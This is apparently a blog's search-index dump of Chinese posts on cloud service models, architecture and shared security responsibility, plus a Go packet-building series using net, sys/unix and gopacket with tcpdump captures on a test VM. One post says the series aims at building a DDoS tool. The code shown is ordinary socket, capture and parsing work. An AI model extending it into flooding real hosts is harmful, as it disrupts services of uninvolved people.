10.211.55.2.52261 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [P.], cksum 0xeed4 (correct), seq 1:21, ack 1, win 2058, options [nop,nop,TS val 2224605755 ecr 3013823431], length 20 02:55:36.432123 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52) 10.211.55.2.52261 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [F.], cksum 0x4fcb (correct), seq 21, ack 1, win 2058, options [nop,nop,TS val 2224605755 ecr 3013823431], length 0 02:55:36.432199 IP (tos 0x0, ttl 64, id 9536, offset 0, flags [DF], proto TCP (6), length 52) ubuntu-linux-20-04-desktop.12345 \u0026gt; 10.211.55.2.52261: Flags [.], cksum 0x83d8 (incorrect -\u0026gt; 0x55d8), ack 21, win 509, options [nop,nop,TS val 3013823432 ecr 2224605755], length 0 02:55:36.446463 IP (tos 0x2,ECT(0), ttl 64, id 9537, offset 0, flags [DF], proto TCP (6), length 608) ubuntu-linux-20-04-desktop.12345 \u0026gt; 10.211.55.2.52261: Flags [P.], cksum 0x8604 (incorrect -\u0026gt; 0x8842), seq 1:557, ack 22, win 509, options [nop,nop,TS val 3013823446 ecr 2224605755], length 556 02:55:36.446805 IP (tos 0x0, ttl 64, id 9538, offset 0, flags [DF], proto TCP (6), length 52) ubuntu-linux-20-04-desktop.12345 \u0026gt; 10.211.55.2.52261: Flags [F.], cksum 0x83d8 (incorrect -\u0026gt; 0x539b), seq 557, ack 22, win 509, options [nop,nop,TS val 3013823447 ecr 2224605755], length 0 02:55:36.446863 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40) 10.211.55.2.52261 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [R], cksum 0x3974 (correct), seq 2853653572, win 0, length 0 02:55:36.446962 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40) 10.211.55.2.52261 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [R], cksum 0x3974 (correct), seq 2853653572, win 0, length 0 明天的目標是：使用gopacket建立一個合法合理的封包。\n碎碎念 我也不確定行不行？\n2023-09-22補 gopacket TCP packet先pass，原碼還沒看完。\n","date":"2023-09-21T00:00:00Z","permalink":"http://localhost:1313/p/day-8-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%AF%AB%E5%B0%81%E5%8C%85-gopacket%E5%88%9D%E5%BB%BA%E5%B0%81%E5%8C%85%E6%9C%AA%E5%AE%8C/","title":"[Day 8] 閑的沒事就寫封包 - gopacket初建封包（未完）"},{"content":"昨天有講到雲端攻擊大多在於使用者設定不當，那來談談關於雲端供應商對於資訊安全方面做了哪些？需要使用者注意哪些？\nAWS Shared Responsibility Model 來源\nAWS負責的是雲端本身的安全\nAWS保護的IaaS、PaaS、SaaS，包含使用的軟硬體、聯網、設施 意思是說AWS只負責關於他們提供的服務本身是否有漏洞 使用者負責雲端內部的安全 包含\n數據 IAM 在執行個體上安裝的APP或是公用程式 網路配置，如VPC等 個體提供的防火牆組態 都是需要使用者自行設定 Azure Shared responsibility in the cloud 來源\n上面明確標示了，使用者需要完全負責\n數據（Data） 端點（Endpoints） 帳戶（Account） 權限管理（Access management） GCP Shared responsibilities and shared fate on Google Cloud 來源\nGCP也不例外，使用者同樣要對\n數據（Data） 訪問決策（Access Policy） 帳戶（Account） 部署（Deployment） 等負責\n","date":"2023-09-20T00:00:00Z","permalink":"http://localhost:1313/p/day-7-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E5%AE%89%E5%85%A8%E6%80%A7%E7%94%B1%E8%AA%B0%E8%B2%A0%E8%B2%AC/","title":"[Day 7] 天堂雲端 - 安全性由誰負責？"},{"content":"Gopacket gopacket是go的第三方庫，主要用於封包捕獲和解析。可以把它當作libpcap（tcpdump的流量捕獲庫） 和 npcap（Wireshark的流量捕獲庫）的 go 封装。\n以下使用gopacket做一些範例\n捕獲主機上所有封包 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; _ \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) func main() { iface := \u0026#34;en0\u0026#34; handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever) if err != nil { log.Fatal(err) } defer handle.Close() // Create packet packetSource := gopacket.NewPacketSource(handle, handle.LinkType()) for packet := range packetSource.Packets() { ethLayer := packet.Layer(layers.LayerTypeEthernet) if ethLayer != nil { ethPacket, _ := ethLayer.(*layers.Ethernet) fmt.Println(\u0026#34;Ethernet Source MAC:\u0026#34;, ethPacket.SrcMAC) fmt.Println(\u0026#34;Ethernet Destination MAC:\u0026#34;, ethPacket.DstMAC) } ipLayer := packet.Layer(layers.LayerTypeIPv4) if ipLayer != nil { ipPacket, _ := ipLayer.(*layers.IPv4) fmt.Println(\u0026#34;IP Source IP:\u0026#34;, ipPacket.SrcIP) fmt.Println(\u0026#34;IP Destination IP:\u0026#34;, ipPacket.DstIP) } tcpLayer := packet.Layer(layers.LayerTypeTCP) if tcpLayer != nil { tcpPacket, _ := tcpLayer.(*layers.TCP) fmt.Println(\u0026#34;TCP Source Port:\u0026#34;, tcpPacket.SrcPort) fmt.Println(\u0026#34;TCP Destination Port:\u0026#34;, tcpPacket.DstPort) } } } 結果就會出現主機收到的所有封包 Ethernet Source MAC: {MAC} Ethernet Destination MAC: {MAC} IP Source IP: {IP} IP Destination IP: {IP} TCP Source Port: {PORT} TCP Destination Port: {PORT} \u0026hellip;\n解析packet 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 package main import ( \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) var ( device string = \u0026#34;en0\u0026#34; snapshot_len int32 = 1024 promiscuous bool = false err error timeout time.Duration = 30 * time.Second handle *pcap.Handle ethLayer layers.Ethernet ipLayer layers.IPv4 tcpLayer layers.TCP udpLayer layers.UDP tlsLayer layers.TLS ipv6Layer layers.IPv6 ) func main() { handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout) if err != nil { log.Fatal(err) } defer handle.Close() packetSource := gopacket.NewPacketSource(handle, handle.LinkType()) for packet := range packetSource.Packets() { printPacket(packet) } } func printPacket(packet gopacket.Packet) { parser := gopacket.NewDecodingLayerParser( layers.LayerTypeEthernet, \u0026amp;ethLayer, \u0026amp;ipLayer, \u0026amp;tcpLayer, \u0026amp;udpLayer, \u0026amp;tlsLayer, \u0026amp;ipv6Layer, \u0026amp;gopacket.Payload{}, ) foundLayerTypes := []gopacket.LayerType{} err := parser.DecodeLayers(packet.Data(), \u0026amp;foundLayerTypes) if err != nil { fmt.Println(\u0026#34;Trouble decoding layers: \u0026#34;, err) } for _, layerType := range foundLayerTypes { switch layerType { case layers.LayerTypeEthernet: fmt.Println(\u0026#34;Ethernet: \u0026#34;, ethLayer.SrcMAC, \u0026#34;-\u0026gt;\u0026#34;, ethLayer.DstMAC) case layers.LayerTypeIPv4: fmt.Println(\u0026#34;IPv4: \u0026#34;, ipLayer.SrcIP, \u0026#34;-\u0026gt;\u0026#34;, ipLayer.DstIP) case layers.LayerTypeTCP: fmt.Println(\u0026#34;TCP Port: \u0026#34;, tcpLayer.SrcPort, \u0026#34;-\u0026gt;\u0026#34;, tcpLayer.DstPort) fmt.Println(\u0026#34;TCP SYN:\u0026#34;, tcpLayer.SYN, \u0026#34; | ACK:\u0026#34;, tcpLayer.ACK) case layers.LayerTypeUDP: fmt.Println(\u0026#34;UDP Port: \u0026#34;, udpLayer.SrcPort, \u0026#34;-\u0026gt;\u0026#34;, udpLayer.DstPort) case layers.LayerTypeTLS: fmt.Println(\u0026#34;TLS Info:\u0026#34;, tlsLayer.Handshake) case layers.LayerTypeIPv6: fmt.Println(\u0026#34;IPv6: \u0026#34;, ipv6Layer.SrcIP, \u0026#34;-\u0026gt;\u0026#34;, ipv6Layer.DstIP) } if appLayer := packet.ApplicationLayer(); appLayer != nil { payload := appLayer.Payload() fmt.Println(\u0026#34;Payload:\u0026#34;, hex.EncodeToString(payload)) } } } 記得要把協定都加進去，我這邊只有加了常見的幾個 輸出結果為： 來源IP/PORT -\u0026gt; 目的IP/PORT Payload\n碎碎念 code寫起來比做socket簡單多了。由於gopacket專門用於封包的捕獲及解析，提供的interface更簡單高效。明天就來寫寫看用gopacket寫單純的封包發送。\n","date":"2023-09-20T00:00:00Z","permalink":"http://localhost:1313/p/day-7-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E6%89%BE%E5%A5%97%E4%BB%B6-gopacket/","title":"[Day 7] 閑的沒事就找套件 - gopacket"},{"content":"所以，上雲真的比較好嗎？\n雲端的優點 成本效益 基本是根據使用者計費，例如S3是根據儲存的量、請求次數、數據傳輸量來計算費用；例如CloudFront是內容傳遞網絡服務，它的計費基於網絡流量，包括請求次數和數據傳輸量。\n高擴展性 還記得落地的機器如果要增加CPU數量或是Memory，首先關機然後拿著新買的CPU或是Memory想辦法裝進去。但放在雲端，按按鍵就可以擴展資源，而且上雲基本都是分布式架構，不需要再大幅改動基礎架構增加成本。\n高可用性與容錯性 雲端供應商提供的雲端服務通常有高可用性（HA）、災害復原 (DR) 選項的決策樹與範例。\n有優點就會有缺點，雲端的缺點 安全性與隱私 將數據及資源放在雲端可能引發安全性問題，特別是使用者開放了公眾訪問權限。在共享的環境中，需要仔細考慮數據保護及合規性。\n依賴供應商 使用雲端服務代表依賴於雲端供應商，如果雲端供應商遇到問題或是改變服務條款，可能對使用者產生影響。例如丹麥雲端服務商遭勒索軟體攻擊，絕大部分用戶資料無法回復。\n網路連接 雲端其中一個先決條件就是穩定可靠的網路，跟區塊鏈一樣。沒有網路什麼都不能做。如果是落地機器的話沒有網路接個螢幕還可能進的去機器裡面。\n依照我自己的經驗，我還是會偏向上雲吧，特別是To C的網站跟處理大資料的系統。落地機器可以吐槽的點太多太多了，尤其是還要建一個機房管理機器，機器要管理要設定資源管控跟告警設定，其實會設定好的資源管控跟災難復原的公司太少了，至今看到不少吐槽滿滿的設定。從資安方面來說，大型的雲端公司因為有很多很多人會在線上處理問題，所以關於0day的漏洞比起開源專案修復的速度會快很多，大部分的漏洞很多都是客戶端設定導致的問題。落地機器由於還需要人員設定，算起來因為不熟練導致的問題其實蠻多的。基於開發跟資安，我偏向把東西上雲，雖然多花了點錢，但是可以花錢買心安。\n","date":"2023-09-19T00:00:00Z","permalink":"http://localhost:1313/p/day-6-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E4%B8%8A%E9%9B%B2%E6%9C%89%E4%BB%80%E9%BA%BC%E5%A5%BD%E8%99%95/","title":"[Day 6] 天堂雲端 - 上雲有什麼好處？"},{"content":"昨天用sys.unix寫好了SYN封包\n發送封包 1 % go run 攔截封包 使用tcpdump攔截封包\n1 $ sudo tcpdump -i eth0 host 10.211.55.10 and port 12345 -v 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # 收到封包 17:38:27.106775 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 64) # 主機ubuntu-linux-20-04-desktop的port 12345收到TCP Flags S(SYN)E(ECE)W(CWR)封包，三次握手第一步封包 10.211.55.2.23457 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [SEW], cksum 0x0e0f (correct), seq 600188989, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 2770151296 ecr 0,sackOK,eol], length 0 17:38:27.106987 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60) # 主機ubuntu-linux-20-04-desktop回傳SYN/ACK封包，Flags S(SYN)E(ECE)，這是TCP三次握手的第二步，注意ACK是上一個封包的SEQ數值的+1值。 ubuntu-linux-20-04-desktop.12345 \u0026gt; 10.211.55.2.23457: Flags [S.E], cksum 0x83e0 (incorrect -\u0026gt; 0xe89b), seq 2971612303, ack 600188990, win 65160, options [mss 1460,sackOK,TS val 2914428151 ecr 2770151296,nop,wscale 7], length 0 17:38:27.107208 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52) # 主機10.211.55.2回傳確認連接封包 10.211.55.2.23457 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [.], cksum 0x0e27 (correct), ack 1, win 2058, options [nop,nop,TS val 2770151296 ecr 2914428151], length 0 17:38:27.107293 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52) # 主機10.211.55.2發送TCP Flag F(FIN)，通知主機ubuntu-linux-20-04-desktop要結束連接。 10.211.55.2.23457 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [F.], cksum 0x0e25 (correct), seq 1, ack 1, win 2058, options [nop,nop,TS val 2770151297 ecr 2914428151], length 0 17:38:27.108219 IP (tos 0x0, ttl 64, id 28745, offset 0, flags [DF], proto TCP (6), length 52) # ubuntu-linux-20-04-desktop發送ACK + 1，此為對上一個封包的確認。 ubuntu-linux-20-04-desktop.12345 \u0026gt; 10.211.55.2.23457: Flags [.], cksum 0x83d8 (incorrect -\u0026gt; 0x142f), ack 2, win 510, options [nop,nop,TS val 2914428153 ecr 2770151297], length 0 17:38:27.108563 IP (tos 0x0, ttl 64, id 28746, offset 0, flags [DF], proto TCP (6), length 52) # ubuntu-linux-20-04-desktop發送TCP Flag F(FIN)封包，通知主機10.211.55.2要結束連接。 ubuntu-linux-20-04-desktop.12345 \u0026gt; 10.211.55.2.23457: Flags [F.], cksum 0x83d8 (incorrect -\u0026gt; 0x142e), seq 1, ack 2, win 510, options [nop,nop,TS val 2914428153 ecr 2770151297], length 0 17:38:27.108788 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52) # 主機10.211.55.2回傳確認封包 10.211.55.2.23457 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [.], cksum 0x0e20 (correct), ack 2, win 2058, options [nop,nop,TS val 2770151299 ecr 2914428153], length 0 # 兩邊主機暫停連接。 ","date":"2023-09-19T00:00:00Z","permalink":"http://localhost:1313/p/day-6-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E6%94%94%E6%88%AA%E5%B0%81%E5%8C%85-%E5%B0%81%E5%8C%85%E8%A7%A3%E6%9E%90/","title":"[Day 6] 閑的沒事就攔截封包 - 封包解析"},{"content":"雲端架構 AWS版本的分布式雲端架構 來源 搜尋aws分布式雲端架構image第一個就出現這張圖，如有不妥我再刪掉自己畫，因為我不太擅長畫這個我畫的都很醜，所以一般我都是在網路上找好看的圖。\n雲端架構都會比較偏向分布式架構，畢竟都上雲了，就不會把db, cache, web app都塞進一個EC2裡面，這樣效益不高成本也高，所以使用者會偏向使用雲端供應商提供的服務。 先來講講架構\nWeb APP EC2 以AWS為例，AWS提供可擴展的IaaS-EC2，供使用者快速開發及部署。類似在Vmware起一台虛擬機 多台虛擬機同時運行同一個網站服務 ELB（Elastic Load Balancing） 可以使用Load Balance(ELB)負載平衡，將流量分發到多台EC2。 ASG（Auto Scaling） 如果有即時監測Web APP效能的需求，AWS提供ASG服務自動增加受限資源的容量，維持高品質服務 Cache ElasticCache AWS提供ElasticCache支援Memcached和Redis快取引擎，依照使用需求選擇適合的快取引擎，全受管 Redis 和 MemCached 相容服務。 資料庫服務 AWS RDS AWS提供的託管關聯式資料庫服務，具有自動備份跟修復跟自動擴展與高可用性等功能。多種常用的引擎支持，例如MySQL、PostgreSQL、MSSQL等。\nAWS Athena AWS提供的無服務器互動式分析服務，以流量計費。建立在Trino跟Presto引擎和Apache Spark框架上，查詢服務支援包括ORC、JSON、CSV、Parquet等資料格式，可以將數據作為靜態檔案存放在S3中。\n從這樣看起來，雲端架構是不是很簡單呢？連接相應的IaaS跟PaaS並組合成想要的架構。諸如無伺服器架構(Serverless framework)在開發中可以解決很多問題；諸如S3等的Object Storage在數據處理等方面更優於Block Storage。使用者可以使用相應的服務還不需要大量的建置與維護的成本，這也是雲端越來越熱門的原因。\n","date":"2023-09-18T00:00:00Z","permalink":"http://localhost:1313/p/day-5-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E9%9B%B2%E7%AB%AF%E6%9E%B6%E6%A7%8B/","title":"[Day 5] 天堂雲端 - 雲端架構"},{"content":"在syscall還未被棄用的時後是用syscall建立socket指定來源PORT。現在使用sys （主題是做DDOS，其實有沒有指定PORT不是重點，但這個在後面做raw socket是重點）\nOverview This repository holds supplemental Go packages for low-level interactions with the operating system.\nDirectories packet description cpu Package cpu implements processor feature detection for various CPU architectures. execabs Package execabs is a drop-in replacement for os/exec that requires PATH lookups to find absolute paths. unix Package unix contains an interface to the low-level operating system primitives. windows Package windows contains an interface to the low-level operating system primitives. 做socket用到sys.unix庫\nSocket 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) func main() { srcIP := \u0026#34;0.0.0.0\u0026#34; // if not know, set 0.0.0.0 srcPort := 23457 targetIP := \u0026#34;10.211.55.10\u0026#34; targetPort := 12345 // build socket fd, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, unix.IPPROTO_TCP) if err != nil { log.Fatal(err) } defer unix.Close(fd) // set source IP and source PORT localAddr := \u0026amp;unix.SockaddrInet4{Port: srcPort} copy(localAddr.Addr[:], net.ParseIP(srcIP).To4()) err = unix.Bind(fd, localAddr) if err != nil { log.Fatal(err) } // connnect remoteAddr := \u0026amp;unix.SockaddrInet4{Port: targetPort} copy(remoteAddr.Addr[:], net.ParseIP(targetIP).To4()) err = unix.Connect(fd, remoteAddr) if err != nil { log.Fatal(err) } fmt.Println(\u0026#34;SYN packet sent successfully!\u0026#34;) } ","date":"2023-09-18T00:00:00Z","permalink":"http://localhost:1313/p/day-5-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%BB%BA%E7%AB%8Bsocket-sys/","title":"[Day 5] 閑的沒事就建立socket - sys"},{"content":"雲端架構 v.s. 一般架構 雲端架構主要基於一般架構，雲端架構只是將一般架構搬上雲，並利用雲供應商提供的雲服務取代一部份的服務，例如隊列(SQS、Azure Service Bus)、資料庫(SQL database、RDS)、快取(ElasticCache)、存儲服務(S3、 Google Cloud Storage)\n一般架構 示意圖（網站架構） 如果實踐一個可以放在網域上的、可以儲存資料的網站，基本會有上圖那樣的網站架構。\n分布式系統設計核心原則之一：拆解，把大系統拆解成互相解耦的幾個相對獨立的小系統\n拆成最小可用系統 可擴展單元系統 安全性 技術要求 \u0026hellip; 講到分布式系統設計有很多可以講，今天先講到這裡（要不然要跑題了）。 總之，為了高擴展性及安全性可用性還有技術要求等一般分布式架構都會拆分成單元小系統，雲端架構同理，所以會有雲端供應商也會推出一些雲端服務例如Queue、Cache等減少使用者建立及維護的負擔。\n一般架構拆解 Web APP 基本網站環境 OS 包含網站框架、程式碼 瀏覽器服務 ex：Nginx/Apache 處理反向代理服務 託管各種規模網站與應用程式 通用TCP/UDP代理伺服器 資料庫服務 適合情境的資料庫服務 關聯式資料庫- MySQL 非結構化資料庫 - NoSQL 高性能列式存儲資料庫 - Clickhouse 快取服務（Cache） 建立適合快取的資料庫，應用高速、高併發量的內存key-value資料庫系統 Redis MemCache ","date":"2023-09-17T00:00:00Z","permalink":"http://localhost:1313/p/day-4-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E9%A1%8C%E5%A4%96%E8%A9%B1%E4%B8%80%E8%88%AC%E6%9E%B6%E6%A7%8B/","title":"[Day 4] 天堂雲端 - 題外話：一般架構"},{"content":"發送封包 昨天建立一個TCP SYN packet TCP Header建立好了，TCP Data暫時不建立。缺了什麼？缺了srcPort\u0026hellip;\n使用net建立packet的時候，go通常不會幫我們選擇未使用的來源port。它期望我們明確指定來源port。因此，我們要自己設定一個未使用的來源port。\n機器要丟一個封包出去，首先就是在1~65535的port隨機找一個還沒被服務站用的port\n來源PORT 建立隨機數字1~65535，當作來源地址發送的PORT 因為PORT被佔用就不能發送封包，所以先把容易被佔用的PORT剔除，這邊列出nmap top 100作為容易佔用的PORT\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 func randomPort() int { // Nmap top ports nmapTopPorts := []int{ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9090, 1433, 2000, 5432, } rand := rand.New(rand.NewSource(time.Now().UnixNano())) var srcPort int for { srcPort = rand.Intn(65535) + 1 if !slices.Contains(nmapTopPorts, srcPort) \u0026amp;\u0026amp; isPortAvailable(uint16(srcPort)) { break } } fmt.Println(\u0026#34;Selected source port:\u0026#34;, srcPort) return srcPort } 測試PORT除了在nmap top 100之外，是否有被佔用\n1 2 3 4 5 6 7 8 9 10 func isPortAvailable(port uint16) bool { addr := fmt.Sprintf(\u0026#34;:%d\u0026#34;, port) listener, err := net.Listen(\u0026#34;tcp\u0026#34;, addr) if err != nil { // 端口已被占用 return false } listener.Close() return true } 接收封包 發送封包\n1 2 3 $ go run \u0026gt; Selected source port: 35413 \u0026gt; SYN packet sent successfully 在靶機上執行tcpdump攔截封包 注：tcpdump預設情況下是給root使用的\n1 sudo tcpdump -i eth0 host 10.211.55.10 and port 12345 -v 攔截封包\n1 2 3 4 16:13:20.913177 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 64) 10.211.55.2.64027 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [SEW], cksum 0x4d64 (correct), seq 947175497, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 393620125 ecr 0,sackOK,eol], length 0 16:13:20.913578 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60) ... 先不提每一筆封包的詳細內容，看第二行10.211.55.2.64027 \u0026gt; ubuntu-linux-20-04-desktop.12345\u0026hellip; 但是terminal輸出表示tcpheader裡面source port應該是35413，跟攔截封包上面的64027對不上\n為什麼 因為net.Dial建立時已經完成TCP的三次握手連接，在conn.Write(tcpHeader)只是重寫一個tcp header到已連接連線中，代表只是在TCP連接的資料流中加入一些byte資料，而這些資料不會被當作header處理，只會被當作一般資料。\n但是tcp header還是要寫，明天來寫。\n","date":"2023-09-17T00:00:00Z","permalink":"http://localhost:1313/p/day-4-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-%E4%BE%86%E6%BA%90%E7%AB%AF%E5%8F%A3%E8%B8%A9%E5%9D%91/","title":"[Day 4] 閑的沒事 - 來源端口（踩坑）"},{"content":"雲端服務模型（Cloud Service Models） 什麼是雲端服務 雲端服務，顧名思義就是在雲端上面使用的服務。主要目的是提供使用者利用網路連接到雲端的服務，並藉此運算、儲存、備份在雲端服務上的資料或資源。可以把雲端服務分成三大類：自行創建、半成品加工、提供完整的服務給使用者\n三大類雲端運算服務模式 IaaS（Infrastructure-as-a-Service）- 自行創建 以虛擬化的形式提供基本運算、儲存及網路資源。使用者可以在這些基本資源上建構及管理自己的環境，同時也要自行管理配置及服務。包含基本作業環境，使用者需要自行安裝應用程式來串接其他服務。\nIaaS例子：\nAWS EC2 Azure VMs 優點：\n高擴展性 彈性調整資源 缺點：\n對於非專業人員的複雜性 使用者要負責資料的安全性 PaaS（Platform-as-a-Service）- 半成品加工 雲端供應商提供給使用者一個可以開發、管理的應用環境，使用者可以使用PaaS開發、測試、部署自己的應用程序。不需要擔心底層設定及管理。\nPaaS例子：\nHeroku Microsoft Azure App Service 優點：\n加速開發人員作業 使用者不需維護軟體 缺點：\n對於某些需求有限制性 依賴供應商的環境及工具 SaaS（Software-as-a-Service）- 提供完整的服務 提供完整的應用程式服務，使用者可以在瀏覽器或是客戶端上直些運行\nSaaS例子：\nDropbox Gmail 優點：\n使用者不需負責軟硬體更新 統一由供應商管理資源 使用者透過網路即可使用 缺點：\n缺乏資料隱私，資料儲存在第三方SaaS 定制性受限高 Summary 對於開發人員而言，雲端運算服務的限制通常按照以下順序排列：SaaS \u0026gt; PaaS \u0026gt; IaaS。這表示開發人員在使用IaaS時擁有最大的彈性，但同時也需要更加關注資料的安全性，特別是當他們使用IaaS服務來部署環境時。對於PaaS和SaaS也同樣如此。儘管雲供應商提供了安全性措施，但如果使用者將敏感資料外洩到公共網絡上，使用者並不能完全歸咎於雲供應商提供的安全性有問題。\n","date":"2023-09-16T00:00:00Z","permalink":"http://localhost:1313/p/day-3-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E4%B8%89%E5%A4%A7%E9%9B%B2%E7%AB%AF%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B/","title":"[Day 3] 天堂雲端-三大雲端服務類型"},{"content":"用什麼套件建構封包 先來測一下有go有什麼packet interface好用的套件，像其他語言例如c、python可以用socket建構封包。python還有另一個套件庫scapy，專門處理各種交互式數據封包操作庫。\n回來go。首先，先建立一個SYN封包。 使用Go原生庫中的net\nOverview Package net provides a portable interface for network I/O, including TCP/IP, UDP, domain name resolution, and Unix domain sockets.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { // 設定標的IP與PORT targetIP := \u0026#34;10.211.55.10\u0026#34; // 這是我建的一台測試VM targetPort := 12345 // 我在VM上起了flask web服務，web佔用12345 port // 建立TCP連接 conn, err := net.Dial(\u0026#34;tcp\u0026#34;, fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, targetIP, targetPort)) if err != nil { fmt.Println(\u0026#34;Error connecting:\u0026#34;, err) return } defer conn.Close() } 因為SYN是TCP/IP建立連線使用的握手信號，所以建立net.Dial得時候使用的是tcp 看一下net.Dial源碼註釋\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 // Dial connects to the address on the named network. // // Known networks are \u0026#34;tcp\u0026#34;, \u0026#34;tcp4\u0026#34; (IPv4-only), \u0026#34;tcp6\u0026#34; (IPv6-only), // \u0026#34;udp\u0026#34;, \u0026#34;udp4\u0026#34; (IPv4-only), \u0026#34;udp6\u0026#34; (IPv6-only), \u0026#34;ip\u0026#34;, \u0026#34;ip4\u0026#34; // (IPv4-only), \u0026#34;ip6\u0026#34; (IPv6-only), \u0026#34;unix\u0026#34;, \u0026#34;unixgram\u0026#34; and // \u0026#34;unixpacket\u0026#34;. // // For TCP and UDP networks, the address has the form \u0026#34;host:port\u0026#34;. // The host must be a literal IP address, or a host name that can be // resolved to IP addresses. // The port must be a literal port number or a service name. // If the host is a literal IPv6 address it must be enclosed in square // brackets, as in \u0026#34;[2001:db8::1]:80\u0026#34; or \u0026#34;[fe80::1%zone]:80\u0026#34;. // The zone specifies the scope of the literal IPv6 address as defined // in RFC 4007. // The functions JoinHostPort and SplitHostPort manipulate a pair of // host and port in this form. // When using TCP, and the host resolves to multiple IP addresses, // Dial will try each IP address in order until one succeeds. // // Examples: // //\tDial(\u0026#34;tcp\u0026#34;, \u0026#34;golang.org:http\u0026#34;) //\tDial(\u0026#34;tcp\u0026#34;, \u0026#34;192.0.2.1:http\u0026#34;) //\tDial(\u0026#34;tcp\u0026#34;, \u0026#34;198.51.100.1:80\u0026#34;) //\tDial(\u0026#34;udp\u0026#34;, \u0026#34;[2001:db8::1]:domain\u0026#34;) //\tDial(\u0026#34;udp\u0026#34;, \u0026#34;[fe80::1%lo0]:53\u0026#34;) //\tDial(\u0026#34;tcp\u0026#34;, \u0026#34;:80\u0026#34;) // // For IP networks, the network must be \u0026#34;ip\u0026#34;, \u0026#34;ip4\u0026#34; or \u0026#34;ip6\u0026#34; followed // by a colon and a literal protocol number or a protocol name, and // the address has the form \u0026#34;host\u0026#34;. The host must be a literal IP // address or a literal IPv6 address with zone. // It depends on each operating system how the operating system // behaves with a non-well known protocol number such as \u0026#34;0\u0026#34; or \u0026#34;255\u0026#34;. // // Examples: // //\tDial(\u0026#34;ip4:1\u0026#34;, \u0026#34;192.0.2.1\u0026#34;) //\tDial(\u0026#34;ip6:ipv6-icmp\u0026#34;, \u0026#34;2001:db8::1\u0026#34;) //\tDial(\u0026#34;ip6:58\u0026#34;, \u0026#34;fe80::1%lo0\u0026#34;) // // For TCP, UDP and IP networks, if the host is empty or a literal // unspecified IP address, as in \u0026#34;:80\u0026#34;, \u0026#34;0.0.0.0:80\u0026#34; or \u0026#34;[::]:80\u0026#34; for // TCP and UDP, \u0026#34;\u0026#34;, \u0026#34;0.0.0.0\u0026#34; or \u0026#34;::\u0026#34; for IP, the local system is // assumed. // // For Unix networks, the address must be a file system path. 